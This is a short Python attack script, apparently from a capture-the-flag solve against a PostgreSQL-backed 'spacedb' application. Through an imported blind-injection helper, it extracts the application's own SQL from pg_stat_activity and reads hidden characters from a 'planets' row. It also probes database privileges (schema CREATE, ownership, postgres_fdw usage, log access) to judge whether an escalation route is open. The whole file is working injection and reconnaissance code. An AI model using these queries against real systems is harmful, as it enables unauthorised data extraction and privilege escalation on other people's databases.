"""Read the application's own SQL text out of pg_stat_activity for MY backend: the injected
statement is exactly what the app sent, so its prefix/suffix tells us which tables and
columns the console really touches.  Plus the privilege facts that decide whether the
fdw/extension route is open at all."""
import extract as E

MINE = "(SELECT query FROM pg_stat_activity WHERE pid=pg_backend_pid() LIMIT 1)"
VENUS = "(SELECT ascii(substr(description,p,1)) FROM planets, generate_series(1,length(description)) p WHERE id=3 AND ascii(substr(description,p,1))>126)"

if __name__ == "__main__":
    print("[*] app sql len:", E.num("(SELECT length(query) FROM pg_stat_activity WHERE pid=pg_backend_pid())"))
    print("[*] venus odd codepoint:", E.read_str(VENUS, 40, "oddcp"))
    for label, e in [
        ("pg_stat_statements", "EXISTS(SELECT 1 FROM pg_proc WHERE proname LIKE 'pg_stat_statements%')"),
        ("owns spacedb", "(SELECT datdba::regrole::text FROM pg_database WHERE datname=current_database())=(SELECT current_user)"),
        ("can create in public", "(SELECT has_schema_privilege(current_user,'public','CREATE'))"),
        ("can use postgres_fdw", "(SELECT has_privilege(current_user,'postgres_fdw','USAGE'))"),
        ("log file readable", "(SELECT length(pg_current_logfile())>0)"),
        ("sql has join", "(SELECT query LIKE '%%join%%' FROM pg_stat_activity WHERE pid=pg_backend_pid())"),
        ("sql mentions zleak", "(SELECT query LIKE '%%zleak%%' FROM pg_stat_activity WHERE pid=pg_backend_pid())"),
    ]:
        try:
            print("   %-22s %s" % (label, E.cond(e)))
        except Exception as ex:
            print("   %-22s EXC %s" % (label, ex))
    print("[=] app sql:", E.read_str(MINE, 300, "sql"), flush=True)
